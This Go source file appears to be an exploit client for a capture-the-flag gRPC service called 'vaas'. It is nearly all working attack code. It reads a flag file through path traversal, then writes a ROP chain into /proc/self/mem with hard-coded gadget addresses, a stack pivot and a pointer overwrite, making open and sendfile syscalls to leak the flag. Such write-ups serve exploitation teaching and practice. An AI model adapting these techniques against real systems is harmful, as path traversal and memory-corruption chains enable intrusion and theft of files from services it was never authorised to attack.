package main

import (
	"bufio"
	"bytes"
	"context"
	"log"
	"net"
	"os"
	"time"

	"google.golang.org/grpc"
	"tasteless.eu/ctf/a2019/vaas"
)

func check(err error) {
	if err != nil {
		log.Println(err)
	}
}

type tee struct {
	net.Conn
}

func (t *tee) Read(b []byte) (n int, err error) {
	n, err = t.Conn.Read(b)
	log.Printf("READ: %s", string(b))
	return
}

func loggedDialer(addr string, timeout time.Duration) (net.Conn, error) {
	c, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}

	return &tee{c}, err
}

func main() {
	// c, err := grpc.Dial("hitme.tasteless.eu:10201", grpc.WithInsecure(), grpc.WithMaxMsgSize(12574282+1000), grpc.WithDialer(loggedDialer))
	c, err := grpc.Dial("localhost:1125", grpc.WithInsecure(), grpc.WithMaxMsgSize(12574282+1000), grpc.WithDialer(loggedDialer))
	check(err)

	input := bufio.NewScanner(os.Stdin)
	input.Scan()

	v := vaas.NewVaaServiceClient(c)

	// exploit 1
	cr, err := v.Checkout(context.Background(), &vaas.CheckoutRequest{Revision: "../../../flag"})
	check(err)
	log.Println(cr)

	// exploit 2
	d := func(a uint64) []byte {
		return []byte{
			byte(a),
			byte(a >> 8),
			byte(a >> 16),
			byte(a >> 24),
			byte(a >> 32),
			byte(a >> 40),
			byte(a >> 48),
			byte(a >> 56),
		}
	}

	loggedError := int64(0xcbb078)

	popRaxRet := uint64(0x0000000000403e69)
	popRspRet := uint64(0x000000000041966c)
	ret := uint64(0x000000000045471b)

	// stack pivot
	newStack := uint64(0xccee00)
	v.Identify(context.Background(), &vaas.IdentifyRequest{Uid: popRspRet, Gid: newStack, Cid: ret})

	popRsiRet := d(0x000000000047bade)
	popRdiRet := d(0x00000000006827d5)
	popRdxRet := d(0x0000000000627402)
	// popR10Ret :=
	blaR10Ret := d(0x000000000057c7ad) // 0x000000000057c01e: cmovb r10, r14; cmovb r11, r15; cmovb r12, rdi; cmovb r13, rsi; ret;
	syscallRet := d(0x000000000045b4a9)

	req := &vaas.ApplyRequest{
		Revision: "../../../proc/self/mem",
		Patches: append([]*vaas.Patch{},
			&vaas.Patch{
				Offset: 0xcced00,
				Patch:  []byte("/flag\x00"),
			},
			&vaas.Patch{
				// rop chain
				Offset: 0xccee00,
				Patch: bytes.Join([][]byte{
					// open
					d(popRaxRet),
					d(2),
					popRdiRet,
					d(0xcced00),
					popRsiRet,
					d(0),
					popRdxRet,
					d(0),
					syscallRet,

					// sendfile
					blaR10Ret, // mangle r10 first

					popRdiRet,
					d(1), // out

					// here is our opened file (i hope)
					popRsiRet,
					d(0x5), // in

					d(popRaxRet),
					d(40),
					popRdxRet,
					d(0),
					syscallRet,

					// bailout
					d(0),
				}, nil),
			},
			&vaas.Patch{
				Offset: 0xccef00,
				Patch:  d(popRaxRet), // pivot stack via uid, gid, cid
			},
			&vaas.Patch{
				Offset: loggedError, // overwrite loggedError
				Patch:  d(0xccef00),
			},
			&vaas.Patch{
				Offset: 0,
				Patch:  d(0), // trigger
			},
		),
	}

	ar, err := v.Apply(context.Background(), req)
	check(err)
	log.Println(ar)
}
